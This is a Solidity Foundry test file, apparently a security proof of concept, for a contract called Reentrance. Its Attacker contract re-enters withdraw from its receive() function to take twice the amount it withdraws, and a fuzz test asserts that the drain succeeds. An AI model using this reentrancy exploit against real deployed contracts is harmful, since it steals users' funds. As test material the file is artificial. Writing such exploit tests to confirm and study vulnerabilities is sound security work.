
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract TestReentrancyReentrance is Test {
    Reentrance public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new Reentrance();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal, uint256 donateVal) public {
        
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max / 2);
        vm.assume(donateVal >= 2 * attackVal && donateVal <= type(uint128).max);
        

        

        

        
        vm.deal(address(_contractUnderTest), donateVal * 2); 
        
        vm.deal(address(_attacker), donateVal * 2);

        vm.deal(address(this), donateVal * 2);

        
        
        _attacker.setupAttack{value: donateVal}(attackVal);
        _attacker.attack(attackVal);

        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    Reentrance public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = Reentrance(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        attackAmount = val;
        
        victim.donate{value: msg.value}(address(this));
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        

        

        victim.withdraw(attackAmount);

        
        if (address(this).balance == initialSnapshot + 2 * attackAmount) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            victim.withdraw(attackAmount);
        }
    }

    fallback() external payable {}
}
